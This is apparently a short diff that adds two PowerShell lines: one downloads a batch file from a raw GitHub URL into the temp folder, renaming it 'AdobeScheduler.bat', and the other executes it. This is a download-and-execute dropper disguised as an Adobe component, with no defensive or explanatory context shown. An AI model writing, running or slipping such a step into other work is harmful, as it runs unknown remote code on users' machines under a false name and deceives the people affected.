@@ -1,0 +1,2 @@
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/LilGorrillo/Cuenteles/main/staff.bat' -OutFile "$env:TEMP\AdobeScheduler.bat"
+Start-Process "$env:TEMP\AdobeScheduler.bat"
